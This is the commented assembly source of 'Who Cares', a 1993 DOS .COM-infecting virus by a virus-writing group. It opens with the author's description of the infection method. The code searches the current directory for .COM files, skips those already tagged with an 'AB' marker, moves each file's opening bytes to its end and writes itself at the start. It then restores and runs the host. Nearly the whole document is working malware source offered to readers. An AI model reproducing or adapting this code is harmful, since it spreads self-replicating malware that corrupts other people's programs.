;****************************************************************************
;  (c) Admiral Bailey and YAM.
;  Name: Who Cares                      Effective Length: 181 bytes
;  By Admiral Bailey - Youths Aganst McAfee '93
;  Notes:
;         While messing around trying to think up new ideas I came across
;  this idea. I different way of infecting. I looked up in VSUM and saw
;  another virus that infected this way. Forgot the name but it's something
;  different. It infects its files by moving the beginning and placing it at
;  the end. It then writes itself to the beginning. In someways its easier
;  but if your use to the other way this can get confusing. But its something
;  different. Check out the code below. I commented it all.
;****************************************************************************

        .model tiny
        .code
        org     100h                            ; All .COM files start here

ID = 'AB'                                       ; Id for infected files

Start:
        db     0e9h,2,0                         ; jmp after ID
        dw     id                               ; stick ID here.

        db      0bdh                            ; move bp,oooo
fileend dw      offset heap                     ; ending of file

DirLoop:

; NOTE: You really should move the dta here or else any command line
; parameter will not work.

        mov     dx,offset comfilespec           ; Files to look for
        call    findfirst                       ; no get all the files

        mov     si,bp                           ; move end of file into si
        sub     si,eof-start                    ; subtract the filesize
                                                ; and you now have the
                                                ; old beginning location
        mov     di,100h                         ; we put it back at the
                                                ; beginning
        push    di                              ; save on stack for return

        mov     cx,eof-start                    ; number of bytes to move

; Now here we put this part in the heap because when moving the bytes back
; it will get overwriten.

        mov     byte ptr [bp],0f3h              ; rep
        mov     byte ptr [bp+1],0a4h            ; movsb
        mov     byte ptr [bp+2],0c3h            ; ret

        jmp     bp                              ; jump to the end of the file

FindFirst:
        mov     ah,4eh                          ; Find first file
        xor     cx,cx                           ; only normal attributes

FindNext:
        int     21h                             ; Find first/next file int
        jc      quit                            ; none found so quit

        call    infection                       ; infect the file found

FindNext2:
        mov     ah,4fh                          ; Find next file
        jmp     findnext                        ; Jump to the loop

Quit:
        ret

Infection:
        mov     ax,3d00h                        ; Open file for read only
        call    open

        mov     ah,3fh                          ; Read from file
        mov     cx,5                            ; 5 bytes
        mov     dx,bp                           ; store in heap
        int     21h

        mov     ah,3eh                          ; Close file
        int     21h

        cmp     ax,(eof-start)+100              ; Is the file too small?
        jb      quit_infect                     ; file to small so get another

        cmp     word ptr [bp+3],id              ; Check for ID
        je      quit_infect

        mov     bx,80h                          ; location of DTA
        mov     dx,word ptr [bx+1ah]            ; Get file size from DTA
        add     dx,eof-start                    ; add virus size
        add     dx,100h                         ; add 100h to fix up
        mov     [fileend],dx                    ; save for new bp

        mov     al,2                            ; open file read/write
        call    open

        mov     ah,3fh                          ; Read from file
        mov     cx,eof-start                    ; Number of bytes
        mov     dx,bp                           ; store in heap
        int     21h

        mov     al,00                           ; Move Fpointer to beginning
        Call    move_fp

        mov     ah,40h                          ; write the virus to the
        mov     cx,eof-start                    ; beginning of the file
        mov     dx,100h                         ; starting
        int     21h

        mov     al,02                           ; move fpointer to end
        call    move_fp

        mov     ah,40h                          ; Write beginning of file to
        mov     cx,eof-start                    ; end
        mov     dx,bp                           ; heap has beginning
        int     21h

        mov     ah,3eh                          ; Close file
        int     21h

quit_infect:

        retn

Move_Fp:
        mov     ah,42h                          ; Move file pointer
        xor     cx,cx                           ; Al has location
        xor     dx,dx                           ; Clear these
        int     21h
        retn

Open:
        mov     ah,3dh                          ; open file
        mov     bx,80h                          ; location of DTA
        lea     dx,[bx+30]                      ; Filename in DTA
        int     21h
        xchg    ax,bx                           ; put file handle in bx
        ret

comfilespec db  '*.com',0                       ; Holds type of file to look fo

EOF     equ     $                               ; Marks the end of file

buffer      db  0cdh,020h,0,0,0                 ; original file goes here
            db  eof-start-5 dup (0)

heap    equ     $

        end     start


